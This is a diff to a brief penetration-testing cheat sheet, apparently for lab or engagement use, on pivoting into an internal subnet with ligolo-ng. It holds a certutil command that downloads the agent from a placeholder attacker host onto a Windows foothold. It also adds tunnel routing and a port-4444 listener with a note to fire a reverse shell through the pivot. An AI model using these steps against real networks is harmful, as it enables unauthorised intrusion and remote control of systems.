@@ -7,7 +7,7 @@ On Kali
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
-ligolo-proxy -selfcert -laddr 0.0.0.0:443
+ligolo-proxy -selfcert -laddr 0.0.0.0:443 --api-laddr 127.0.0.1:9999 
 ```
 
 Copy files to foothold 
@@ -26,10 +26,10 @@ certutil.exe -urlcache -split -f http://{{LHOST}}/Ligolo/ligolo-ng_agent_0.9_win
 Back on Kali 
 
 ```bash
-# ligolo >> session
-# ligolo >> 1
-# ligolo >> start
+# ligolo >> session ~ 1 ~ start 
 sudo ip route add {{SUBNET}}/24 dev ligolo
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444  # or 80 etc 
+# Fire rev shell at pivot machine. 
 
 # Ready for nmap or ssh etc. 
 sudo ip route del {{SUBNET}}/24
